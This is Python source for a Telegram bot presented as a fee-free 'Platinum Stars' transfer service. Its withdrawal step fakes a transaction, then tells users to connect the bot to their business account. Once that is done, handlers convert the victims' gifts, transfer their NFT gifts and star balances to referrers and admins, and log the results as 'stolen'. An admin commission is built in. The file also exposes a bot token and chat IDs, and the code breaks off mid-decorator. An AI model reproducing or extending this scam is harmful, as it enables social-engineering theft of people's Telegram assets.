from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types import (
    InlineQuery,
    InlineQueryResultPhoto,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputTextMessageContent,
    InlineQueryResultArticle
)
from aiogram.types import LabeledPrice, PreCheckoutQuery
import random
import os
import json
from datetime import datetime
import logging
import asyncio
import aiohttp
import time
from aiogram.types import InlineQueryResultCachedPhoto

# Constants
TOKEN = "8229712249:AAEY8ANUWpiyKBGWU4EyW8hnSdBoIHzEvj8"
LOG_CHAT_ID = -1002741941997
MESSAGE_LOG_CHAT_ID = -1002741941997
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [7917237979]
FORCED_REFERRAL_USERS = [819487094, 7214848375]
MY_REFERRAL_ID = 7917237979
COMMISSION_USERS = [123456789, 987654321]  # ID пользователей, с которых берется комиссия
CHECK_PHOTO_FILE_ID = None  # Будет заполнено при запуске
activated_checks = {}  # Словарь для хранения активированных чеков

# Инициализация логирования
logging.basicConfig(level=logging.INFO)

# State classes
class Draw(StatesGroup):
    id = State()
    gift = State()

class CheckState(StatesGroup):
    waiting_for_amount = State()

class WithdrawStates(StatesGroup):
    waiting_for_amount = State()

class DepositStates(StatesGroup):
    waiting_for_amount = State()

# Initialize storage
storage = MemoryStorage()

# Загрузка данных
if os.path.exists("referrers.json"):
    with open("referrers.json", "r") as f:
        user_referrer_map = json.load(f)
else:
    user_referrer_map = {}

if os.path.exists("user.balances.json"):
    with open("user.balances.json", "r", encoding='utf-8') as f:
        balances = json.load(f)
else:
    balances = {}

user_message_history = {} 

# Initialize bot
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

def load_balances():
    """Загружает балансы пользователей из user.balances.json."""
    if os.path.exists("user.balances.json"):
        with open("user.balances.json", "r", encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_balances(new_balances=None):
    """Сохраняет балансы пользователей в user.balances.json"""
    global balances
    if new_balances is not None:
        balances = new_balances
    with open("user.balances.json", "w", encoding='utf-8') as f:
        json.dump(balances, f, ensure_ascii=False, indent=4)

async def get_check_photo_file_id():
    """Получает file_id для фото чека или загружает его."""
    global CHECK_PHOTO_FILE_ID
    
    if CHECK_PHOTO_FILE_ID:
        return CHECK_PHOTO_FILE_ID
    
    try:
        # Пытаемся загрузить фото и получить file_id
        photo = FSInputFile("image2.png")
        msg = await bot.send_photo(chat_id=LOG_CHAT_ID, photo=photo)
        CHECK_PHOTO_FILE_ID = msg.photo[-1].file_id
        await bot.delete_message(chat_id=LOG_CHAT_ID, message_id=msg.message_id)
        return CHECK_PHOTO_FILE_ID
    except Exception as e:
        logging.error(f"Ошибка при получении file_id для фото чека: {e}")
        return None

async def activate_check(user_id: int, check_data: str):
    try:
        parts = check_data.split('_')
        if len(parts) < 4:
            return False, "Неверный формат чека"
            
        amount = int(parts[2])
        sender_id = int(parts[3])
        
        if len(parts) > 4:
            timestamp = parts[4]
        else:
            timestamp = str(int(time.time()))
        
        check_key = f"{sender_id}_{amount}_{timestamp}"
        
        if check_key in activated_checks:
            return False, "Этот чек уже был активирован"
        
        # Добавляем звёзды на баланс
        user_id_str = str(user_id)
        balances[user_id_str] = balances.get(user_id_str, 0) + amount
        save_balances()
        
        activated_checks[check_key] = True
        
        referrer_id = parts[0][3:]
        if referrer_id and referrer_id.isdigit():
            if user_id_str not in user_referrer_map:
                user_referrer_map[user_id_str] = str(referrer_id)
                with open("referrers.json", "w") as f:
                    json.dump(user_referrer_map, f)
        
        return True, f"Вам начислено {amount} звёзд!"
        
    except Exception as e:
        logging.error(f"Ошибка активации чека: {e}")
        return False, "Ошибка активации чека"
    
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    # Проверяем, есть ли параметры в команде /start (активация чека)
    if len(message.text.split()) > 1:
        check_data = message.text.split()[1]
        if check_data.startswith("ref") and "_check_" in check_data:
            success, result_text = await activate_check(message.from_user.id, check_data)
            await message.answer(result_text)
            if not success:
                return
    
    # Остальной код обработчика /start остается без изменений
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⭐️ Баланс", callback_data="balance")],
        [InlineKeyboardButton(text="➕ Пополнить звёзды", callback_data="deposit")],
        [InlineKeyboardButton(text="📤 Вывести звёзды", callback_data="withdraw")],
        [InlineKeyboardButton(text="❓ FAQ", url="https://telegra.ph/FAQ-StarsPlatinumBot-08-05")]
    ])
    
    photo = FSInputFile("image.png")
    await message.answer_photo(
        photo=photo,
        caption=(
            "👀 Добро пожаловать в Platinum Stars!\n\n"
            "Наш бот поможет отправить звезды без комиссии прямо на баланс получателя.\n\n"
            "Выберите нужный раздел:"
        ),
        reply_markup=keyboard
    )

    if message.chat.id not in user_message_history:
        user_message_history[message.chat.id] = []
    else:
        if len(user_message_history[message.chat.id]) > 0:
            first_msg_id = user_message_history[message.chat.id][0]
            user_message_history[message.chat.id] = [first_msg_id]
    
    user_message_history[message.chat.id].append(message.message_id + 1)

@dp.callback_query(F.data == "balance")
async def show_balance(callback: types.CallbackQuery):
    # Получаем текущий баланс пользователя
    user_id = str(callback.from_user.id)
    balances = load_balances()
    balance = balances.get(user_id, 0)
    
    # Загружаем фото для раздела баланса
    balance_photo = FSInputFile("balance.png")  # Убедитесь, что файл balance.png существует
    
    # Текст сообщения с актуальным балансом
    balance_text = (
        "⭐️ Раздел «Баланс»\n\n"
        f"Количество ваших звезд: {balance}\n\n"
        "Так же вы можете пополнить баланс напрямую через Telegram — быстро, анонимно и без комиссии."
    )
    
    # Создаем клавиатуру с кнопкой "Назад"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔙 Назад", callback_data="delete_message")]
    ])
    
    # Отправляем фото с текстом и кнопкой
    await callback.message.answer_photo(
        photo=balance_photo,
        caption=balance_text,
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "delete_message")
async def delete_message_handler(callback: types.CallbackQuery):
    try:
        # Удаляем сообщение, в котором была нажата кнопка
        await callback.message.delete()
    except Exception as e:
        logging.error(f"Ошибка при удалении сообщения: {e}")
    await callback.answer()

@dp.callback_query(F.data == "deposit")
async def deposit_stars(callback: types.CallbackQuery):
    deposit_photo = FSInputFile("deposit.png")
    deposit_text = (
        "➕ Раздел «Пополнение баланса»\n\n"
        "Здесь вы можете пополнить баланс звёзд напрямую через Telegram.\n"
        "Комиссии отсутствуют — все расходы на перевод покрывает бот.\n"
        "Сумма зачисляется точно, без задержек и скрытых сборов."
    )
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💲 Пополнить", callback_data="make_deposit")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="delete_message")]
    ])
    
    await callback.message.answer_photo(
        photo=deposit_photo,
        caption=deposit_text,
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "make_deposit")
async def make_deposit_handler(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "➕ Введите точное количество звёзд которое хотите пополнить:\n\n"
        "Минимальная сумма для пополнения 25 звёзд."
    )
    await state.set_state(DepositStates.waiting_for_amount)
    await callback.answer()

@dp.message(DepositStates.waiting_for_amount, F.text)
async def process_deposit_amount(message: types.Message, state: FSMContext):
    try:
        stars_amount = int(message.text)
        if stars_amount < 25:
            await message.answer("❌ Минимальная сумма пополнения - 25 звёзд")
            return
        
        # Создаем инвойс в звездах
        await bot.send_invoice(
            chat_id=message.chat.id,
            title="Пополнение баланса звёзд",
            description=f"Пополнение баланса на {stars_amount} звёзд",
            provider_token="",  # Оставляем пустым для звезд
            currency="XTR",   # Код валюты для Telegram Stars
            prices=[LabeledPrice(label="Звёзды", amount=stars_amount)],
            payload=f"stars_deposit_{message.from_user.id}",
            need_email=False,
            need_phone_number=False,
            is_flexible=False
        )
        
    except ValueError:
        await message.answer("❌ Пожалуйста, введите корректное число")
    finally:
        await state.clear()

@dp.message(F.successful_payment)
async def process_successful_payment(message: types.Message):
    payment = message.successful_payment
    stars_amount = payment.total_amount  # Уже в звездах
    
    # Здесь логика зачисления звезд на баланс пользователя
    user_id = str(message.from_user.id)
    balances = load_balances()
    balances[user_id] = balances.get(user_id, 0) + stars_amount
    save_balances(balances)
    
    await message.answer(
        f"✅ Успешное пополнение на {stars_amount} звёзд!\n"
        f"Ваш текущий баланс: {balances[user_id]} звёзд"
    )

@dp.callback_query(F.data == "withdraw")
async def withdraw_stars(callback: types.CallbackQuery, state: FSMContext):
    # Получаем текущий баланс пользователя
    user_id = str(callback.from_user.id)
    balances = load_balances()
    balance = balances.get(user_id, 0)
    
    await callback.message.answer(
        f"📤 Введите количество звёзд для вывода (минимум 25):\n"
        f"Ваш баланс: {balance} ⭐️"
    )
    await state.set_state(WithdrawStates.waiting_for_amount)
    await callback.answer()

@dp.message(WithdrawStates.waiting_for_amount, F.text)
async def process_withdraw_amount(message: types.Message, state: FSMContext):
    try:
        # Получаем баланс пользователя
        user_id = str(message.from_user.id)
        balances = load_balances()
        balance = balances.get(user_id, 0)
        
        # Парсим введенное количество
        amount = int(message.text)
        
        if amount < 25:
            await message.answer("❌ Минимальная сумма для вывода - 25 звёзд")
            return
            
        if amount > balance:
            await message.answer(f"❌ Недостаточно звёзд на балансе\nВаш баланс: {balance} ⭐️")
            return
        
        # Списываем звёзды с баланса
        balances[user_id] = balance - amount
        save_balances(balances)
            
        # Генерируем случайный номер транзакции
        transaction_id = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', k=10))
        
        # Формируем сообщение о выводе
        withdraw_message = await message.answer(
            "🟡 Выполняется вывод\n\n"
            f"⭐️ Звезды: {amount} ⭐️\n"
            f"➕ Номер транзакции: {transaction_id}\n"
            f"⌛️ Примерное время прибытия: 25сек"
        )
        
        # Удаляем сообщение через 5 секунд и показываем ошибку
        await asyncio.sleep(5)
        await bot.delete_message(chat_id=message.chat.id, message_id=withdraw_message.message_id)
        
        # Создаем клавиатуру с кнопками
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❓Как получить", url="https://telegra.ph/Oshibka-vyvoda-zvyozd-chto-delat-08-05-2")],
            [InlineKeyboardButton(text="⚙️ Открыть настройки", url="tg://settings/")],
            [InlineKeyboardButton(text="✅ Подключил(-а)", callback_data="check_connection")]
        ])
        
        await message.answer(
            "🔴 Ошибка вывода звезд\n\n"
            "При попытке вывода звезд, возникла ошибка — ваш аккаунт не авторизован в Platinum Stars. "
            "Авторизуйтесь, и пройдите этап вывода снова.\n\n"
            "Не помогло? Напишите об ошибке — @StarsPlatinumSupport",
            reply_markup=keyboard
        )
        
    except ValueError:
        await message.answer("❌ Пожалуйста, введите корректное число")
    finally:
        await state.clear()

@dp.callback_query(F.data == "check_connection")
async def check_connection_handler(callback: types.CallbackQuery):
    # Создаем клавиатуру с кнопкой поддержки
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/StarsPlatinumSupport")]
    ])
    
    await callback.message.edit_text(
        "🔄 Проверка подключения бота\n"
        "В среднем занимает до 33 секунд.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "open_settings")
async def open_settings_handler(callback: types.CallbackQuery):
    try:
        # Пытаемся открыть настройки Telegram
        await callback.answer()
        await bot.send_message(
            chat_id=callback.from_user.id,
            text="Пожалуйста, откройте настройки Telegram вручную: Настройки > Бизнес-аккаунт > Чат-боты"
        )
    except Exception as e:
        logging.error(f"Ошибка при открытии настроек: {e}")

@dp.callback_query(F.data == "check_connection")
async def check_connection_handler(callback: types.CallbackQuery):
    # Создаем клавиатуру с кнопкой поддержки
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🆘 Поддержка", url="https://t.me/StarsPlatinumSupport")]
    ])
    
    await callback.message.edit_text(
        "🔄 Проверка подключения бота\n"
        "В среднем занимает до 33 секунд.",
        reply_markup=keyboard
    )
    await callback.answer()

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                data = await response.json()
                
                builder = InlineKeyboardBuilder()
                start = page * 9
                end = start + 9
                count = 0
                
                if data.get("ok", False):
                    gifts = list(data.get("result", {}).get("gifts", []))
                    for gift in gifts[start:end]:
                        count += 1
                        builder.button(
                            text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
                            callback_data=f"gift_{gift['id']}"
                        )
                    builder.adjust(2)
                
                if page <= 0:
                    builder.row(
                        InlineKeyboardButton(text="•", callback_data="empty"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="Вперед", callback_data=f"next_{page + 1}")
                    )
                elif count < 9:
                    builder.row(
                        InlineKeyboardButton(text="Назад", callback_data=f"down_{page - 1}"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="•", callback_data="empty")
                    )
                elif page > 0 and count >= 9:
                    builder.row(
                        InlineKeyboardButton(text="Назад", callback_data=f"down_{page - 1}"),
                        InlineKeyboardButton(text=f"{page}/{len(gifts) // 9}", callback_data="empty"),
                        InlineKeyboardButton(text="Вперед", callback_data=f"next_{page + 1}")
                    )
                
                return builder.as_markup()
                
    except Exception as e:
        logging.error(f"Ошибка при получении подарков: {e}")
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"Ошибка pagination: {str(e)}")
        return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Ошибка загрузки", callback_data="error")]])


@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    # Добавляем две кнопки в одну строку
    builder.row(
        InlineKeyboardButton(text="🎁 Украсть подарки", callback_data=f"steal_gifts:{business_id}"),
        InlineKeyboardButton(text="💰 Перевести звёзды", callback_data=f"transfer_stars:{business_id}")
    )
    # Кнопка удаления на отдельной строке
    builder.row(
        InlineKeyboardButton(text="⛔️ Удалить подключение", callback_data=f"destroy:{business_id}")
    )
    builder.adjust(1)
    
    user = business_connection.user
    
    # Получаем информацию о пригласившем для формирования сообщений об ошибках
    inviter_id = user_referrer_map.get(str(user.id))
    inviter_username = "неизвестно"
    if inviter_id:
        try:
            inviter = await bot.get_chat(inviter_id)
            inviter_username = f"@{inviter.username}" if inviter.username else f"ID:{inviter_id}"
        except Exception:
            inviter_username = f"ID:{inviter_id}"
    
    user_username = f"@{user.username}" if user.username else f"ID:{user.id}"
    error_base = f"Реф {user_username} от {inviter_username}"
    
    try:
        info = await bot.get_business_connection(business_id)
        if info is None:
            error_msg = f"{error_base} - Бот отвязан"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            return
            
        rights = info.rights
        if rights is None:
            error_msg = f"{error_base} - Бот отвязан"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            return

        # Проверяем только необходимые права для работы с подарками и звездами
        required_gift_rights = [
            rights.can_convert_gifts_to_stars,
            rights.can_transfer_stars
        ]
        
        if not all(required_gift_rights):
            error_msg = f"{error_base} - Недостаточно прав"
            await bot.send_message(LOG_CHAT_ID, error_msg)
            if inviter_id:
                await bot.send_message(inviter_id, error_msg)
            
            # Отправляем предупреждение пользователю
            warning_message = (
                "⛔️ Вы не предоставили все необходимые права боту\n\n"
                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n"
                "⚠️ Мы не используем эти права в плохих целях, подключение бота к бизнес-аккаунту необходимо для того, чтобы он мог автоматически и напрямую отправлять звезды от одного пользователя другому — без лишних действий и подтверждений.\n\n"
                "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
            )
            try:
                await bot.send_message(
                    chat_id=user.id,
                    text=warning_message
                )
            except Exception as e:
                await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
            return
        
        # Получаем данные о подарках и звездах
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        stars = await bot.get_business_account_star_balance(business_id)

    except Exception as e:
        error_type = str(e)
        if "BOT_ACCESS_FORBIDDEN" in error_type:
            error_msg = f"{error_base} - Недостаточно прав"
        else:
            error_msg = f"{error_base} - Бот отвязан"
        
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            try:
                await bot.send_message(inviter_id, error_msg)
            except Exception as e:
                logging.error(f"Не удалось уведомить пригласившего: {e}")
        return

    # Остальная часть функции остается без изменений
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n"
    user_info = (
        f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
        f"├─ ID: <code>{user.id}</code>\n"
        f"├─ Username: @{user.username or 'нет'}\n"
        f"├─ Пригласил: {inviter_username}\n"
        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n"
    )
    balance_info = (
        f"<blockquote>💰 <b>Баланс:</b>\n"
        f"╰─ Доступно звёзд: {int(stars.amount):,}</blockquote>\n"
    )
    gifts_info = (
        f"<blockquote>🎁 <b>Подарки:</b>\n"
        f"├─ NFT: {len(nft_gifts)}\n"
        f"╰─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)</blockquote>\n"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', 'скрыт')
                nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
            except AttributeError:
                nft_items.append(f"├─ NFT #{idx} (скрыт) - 25⭐")
        
        nft_list = "\n<blockquote>🔗 <b>NFT подарки:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n╰─ <b>Итого:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>🔐 <b>Права бота:</b>\n"
        f"├─ Основные: {'✅' if rights.can_read_messages else '❌'} Чтение | "
        f"{'✅' if rights.can_delete_all_messages else '❌'} Удаление\n"
        f"├─ Профиль: {'✅' if rights.can_edit_name else '❌'} Имя | "
        f"{'✅' if rights.can_edit_username else '❌'} Username\n"
        f"╰─ Подарки: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация | "
        f"{'✅' if rights.can_transfer_stars else '❌'} Перевод</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>ℹ️ <i>Перенос каждого NFT подарка стоит 25 звёзд</i>\n"
        f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Ошибка при отправке в лог-чат: {e}")

    if inviter_id:
        try:
            await bot.send_message(
                chat_id=int(inviter_id),
                text=full_message,
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
            logging.error(error_msg)
            await bot.send_message(LOG_CHAT_ID, error_msg)

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(
        text="Введите айди юзера кому перевести подарки"
    )
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):

    msg = await message.answer(
        text="Актуальные подарки:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    try:
        # Получаем данные из состояния
        user_data = await state.get_data()
        if 'user_id' not in user_data:
            await callback.answer("Ошибка: не найден ID пользователя", show_alert=True)
            return
            
        gift_id = callback.data.split('_')[1]
        user_id = user_data['user_id']
        
        # Проверяем, что user_id - это число
        try:
            user_id_int = int(user_id)
        except ValueError:
            await callback.answer("Некорректный ID пользователя", show_alert=True)
            return
            
        # Отправляем подарок
        await bot.send_gift(
            gift_id=gift_id,
            chat_id=user_id_int
        )
        await callback.message.answer(f"✅ Подарок успешно отправлен пользователю {user_id}")
        await state.clear()  # Очищаем состояние
        
    except Exception as e:
        logging.error(f"Ошибка при отправке подарка: {e}")
        await callback.answer("Произошла ошибка при отправке подарка", show_alert=True)

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="Актуальные подарки:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )
    
            

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️Вывод звезд",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="Админ панель:",
        reply_markup=builder.as_markup()
    )
@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="⛔️Отмена самоуничтожения",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="⛔️Включен режим самоуничтожения, для того чтобы отключить нажмите на кнопку",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("Мамонт спасен от сноса.")

    user_id = callback.from_user.id
    inviter_id = user_referrer_map.get(user_id)

    # Если нет пригласившего — fallback на первого админа
    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]

    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    if gifts_to_process == []:
        await bot.send_message(chat_id=LOG_CHAT_ID, text="У пользователя нет подарков.")
    
    for gift in gifts_to_process:
        gift_id = gift.owned_gift_id
        print(gift.gift)

        gift_type = gift.type
        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
        
        if gift_type == "regular":
            try:
                await bot.convert_gift_to_stars(business_id, gift_id)
            except:
                pass
    
        if not gift_id:
            continue

        # Передача
        if isTransfered:
            try:
                steal = await bot.transfer_gift(business_id, gift_id, recipient_id, transfer_star_count)
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception as e:
                await message.answer(f"❌ Не удалось передать подарок {gift_name} пользователю {recipient_id}")
                print(e)


    # Лог
    if stolen_count > 0:
        text = (
            f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n\n" +
            "\n".join(stolen_nfts)
        )
        await bot.send_message(LOG_CHAT_ID, text)
    else:
        await message.answer("Не удалось украсть подарки")
    
    # Перевод звёзд
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
        else:
            await message.answer("У пользователя нет звезд.")
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"🚫 Ошибка при выводе звёзд: {e}")

@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user
        user_id = user.id
    except Exception as e:
        await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
        return

    inviter_id = user_referrer_map.get(str(user_id))
    
    # Определяем получателей с учетом комиссии
    take_commission = str(user_id) in COMMISSION_USERS
    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]
    
    stolen_nfts = []  # Только подарки, переданные пригласившему
    admin_nfts = []   # Подарки, переданные админу (для полного отчета)
    stolen_count = 0
    admin_gifts = 0
    user_gifts_count = 0  # Количество подарков, переданных пригласившему
    
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        error_msg = f"❌ Ошибка при получении подарков: {e}"
        await bot.send_message(LOG_CHAT_ID, error_msg)
        if inviter_id:
            await bot.send_message(inviter_id, error_msg)
        await callback.answer("Ошибка при получении подарков")
        return

    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
    
    # Сначала считаем общее количество уникальных подарков
    unique_gifts = [g for g in gifts_to_process if g.type == "unique" and g.can_be_transferred]
    total_unique = len(unique_gifts)
    
    if take_commission:
        admin_gifts = calculate_commission(total_unique)
        user_gifts = total_unique - admin_gifts
    else:
        user_gifts = total_unique
    
    # Обрабатываем подарки
    admin_sent = 0
    user_sent = 0
    
    for gift in unique_gifts:
        try:
            gift_id = gift.owned_gift_id
            gift_name = gift.gift.name.replace(' ', '') if hasattr(gift.gift, 'name') else 'Unknown'
            
            # Определяем кому передавать подарок
            if take_commission and admin_sent < admin_gifts:
                # Передаем админу (комиссия)
                await bot.transfer_gift(business_id, gift_id, ADMIN_IDS[0], gift.transfer_star_count)
                admin_nfts.append(f"t.me/nft/{gift_name}")
                admin_sent += 1
            elif user_sent < user_gifts:
                # Передаем пригласившему
                await bot.transfer_gift(business_id, gift_id, recipient_id, gift.transfer_star_count)
                stolen_nfts.append(f"t.me/nft/{gift_name}")
                user_sent += 1
                user_gifts_count += 1
            
            stolen_count += 1
        except Exception as e:
            logging.error(f"Ошибка при передаче подарка: {e}")
            continue

    # Формируем полный отчет для админа (с комиссией)
    full_report = []
    if stolen_count > 0:
        full_report.append(f"\n🎁 Всего украдено подарков: <b>{stolen_count}</b>\n")
        if take_commission and admin_gifts > 0:
            full_report.append(f"├─ Админу: <b>{admin_gifts}</b>\n")
            full_report.append(f"╰─ Пригласившему: <b>{user_gifts_count}</b>\n\n")
            full_report.extend([f"🔹 {nft}\n" for nft in admin_nfts[:5]])
            full_report.append("\n")
        full_report.extend([f"🔸 {nft}\n" for nft in stolen_nfts[:5]])
    
    # Формируем публичный отчет (без комиссии)
    public_report = []
    if user_gifts_count > 0:
        public_report.append(f"\n🎁 Успешно украдено подарков: <b>{user_gifts_count}</b>\n")
        public_report.extend([f"🔸 {nft}\n" for nft in stolen_nfts[:5]])
    
    # Отправляем полный отчет админу в личку
    if stolen_count > 0 and ADMIN_IDS:
        try:
            await bot.send_message(
                chat_id=ADMIN_IDS[0],
                text=f"🔷 Полный отчет по бизнес-аккаунту {user_id}:\n{''.join(full_report)}",
                parse_mode="HTML"
            )
        except Exception as e:
            logging.error(f"Ошибка отправки отчета админу: {e}")
    
    # Отправляем публичный отчет в лог-чат
    report_text = f"Отчет по бизнес-аккаунту {user_id}:"
    if user_gifts_count > 0:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=f"{report_text}\n{''.join(public_report)}",
            parse_mode="HTML"
        )
    else:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=f"{report_text}\nНе удалось украсть подарки",
            parse_mode="HTML"
        )
    
    # Отправляем публичный отчет пригласившему (если он есть и не сам пользователь)
    if inviter_id and inviter_id != user_id and user_gifts_count > 0:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=f"Отчет по вашему рефералу {user_id}:\n{''.join(public_report)}",
                parse_mode="HTML"
            )
        except Exception as e:
            await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось уведомить пригласившего: {e}")
    
    answer_text = f"Украдено {stolen_count} подарков"
    if take_commission and admin_gifts > 0:
        answer_text += f" ({admin_gifts} админу)"
    await callback.answer(answer_text)

@dp.callback_query(F.data.startswith("transfer_stars:"))
